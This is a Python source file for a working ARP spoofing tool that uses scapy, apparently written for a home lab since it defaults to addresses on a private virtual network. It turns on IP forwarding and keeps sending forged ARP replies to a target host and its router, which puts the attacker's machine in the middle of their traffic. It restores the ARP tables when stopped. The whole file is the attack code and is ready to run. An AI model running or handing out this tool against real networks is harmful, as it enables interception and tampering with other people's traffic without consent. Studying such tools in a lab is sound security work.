#!/usr/bin/env python3

import argparse             # https://docs.python.org/3/library/argparse.html
import os                   # https://docs.python.org/3/library/os.html
import scapy.all as scapy   # https://scapy.readthedocs.io/en/latest/index.html
import subprocess           # https://docs.python.org/3/library/subprocess.html
import time                 # https://docs.python.org/3/library/time.html
import sys                  # https://docs.python.org/3/library/sys.html
import textwrap             # https://docs.python.org/3/library/textwrap.html


def is_not_root():
    return os.geteuid() != 0


def get_args():
    parser = argparse.ArgumentParser(
        description="ARP spoof tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """Example: 
            arp_spoofer.py -t 192.168.122.75 -s 192.168.122.1
            arp_spoofer.py  # with defaults -t 192.168.122.75 -s 192.168.122.1
        """
        ),
    )
    parser.add_argument("-t", "--target", default="192.168.122.75", help="target IP address")
    parser.add_argument("-r", "--router", default="192.168.122.1", help="spoof this IP address")
    values = parser.parse_args()
    return values


def set_forward():
    print("[+] Setting forward")
    try:
        subprocess.check_output(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    except subprocess.CalledProcessError:
        print("[-] Could not set forward")
        sys.exit()


def unset_forward():
    print("[+] Unsetting forward")
    try:
        subprocess.check_output(["sysctl", "-w", "net.ipv4.ip_forward=0"])
    except subprocess.CalledProcessError:
        print("[-] Could not unset forward")
        sys.exit()


def get_mac(ip):
    # Create ARP broadcast request
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    # Send and receive
    answer = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answer[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # Creating ARP response packet
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, source_ip):
    dst_mac = get_mac(target_ip)
    src_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2, pdst=target_ip, hwdst=dst_mac, psrc=source_ip, hwsrc=src_mac
    )
    scapy.send(packet, verbose=False, count=4)


if __name__ == "__main__":
    if is_not_root():
        sys.exit("[-] This script requires superuser privileges.")

    # For example with target IP 192.168.122.75 and spoof IP 192.168.122.1
    # Use network_scanner to find target IP, and route -n to find router IP
    options = get_args()
    set_forward()
    sent_packets_count = 0
    try:
        while True:
            spoof(options.target, options.router)
            spoof(options.router, options.target)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets sent: " + str(sent_packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C ... ")
        print("[+] Restoring original ARP values")
        restore(options.target, options.router)
        restore(options.router, options.target)
        unset_forward()
        print("[+] Done")
